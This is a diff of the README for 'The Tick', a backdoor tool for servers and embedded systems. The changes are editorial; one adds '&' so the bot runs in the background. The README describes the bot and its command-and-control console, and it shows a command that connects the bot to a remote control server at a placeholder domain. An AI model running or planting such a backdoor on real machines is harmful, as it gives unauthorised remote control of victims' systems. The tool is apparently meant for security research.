@@ -1,6 +1,6 @@
 # The Tick
 
-A simple embedded Linux backdoor.
+A simple backdoor for servers and embedded systems.
 
 - [The Tick](#the-tick)
   * [Compiling](#compiling)
@@ -14,7 +14,7 @@ A simple embedded Linux backdoor.
 
 As with any backdoor type tool, there are two components - the bot that is run on the machine you want to control, and a command and control console where the backdoor connects to.
 
-### The bot (ticksvc)
+### The bot (`ticksvc`)
 
 The bot is called `ticksvc` and you may find pre-built binaries for many platforms in the Releases section. However, if you want to run ticksvc on a platform that we currently don't have a pre-built binary for, you'll need to compile it yourself (see the section below). Currently supported platforms are:
 
@@ -55,7 +55,7 @@ The exact location for the `Tick.desktop` file may vary across Linux distributio
 To run the backdoor binary on the target platform, set the control server hostname and port as command line options. For example:
 
 ```
-./ticksvc control.example-domain.com 5555
+./ticksvc control.example-domain.com 5555 &
 ```
 
 At the control server, you may want to run the console inside a GNU screen instance or similar:
@@ -120,6 +120,6 @@ Currently all builds are generic portable binaries, but the plan is to include b
 
 ## Media
 
-The Tick has been referenced in the following 44Con presentation by Daniel Romero and Mario Rivas:
+An early version of The Tick has been referenced in the following 44Con presentation by Daniel Romero and Mario Rivas:
 
 [![](http://img.youtube.com/vi/plu7U0Sq9HQ/0.jpg)](http://www.youtube.com/watch?v=plu7U0Sq9HQ "Office Equipment: The Front Door To Persistence On Enterprise Networks - D. Romero and M. Rivas")
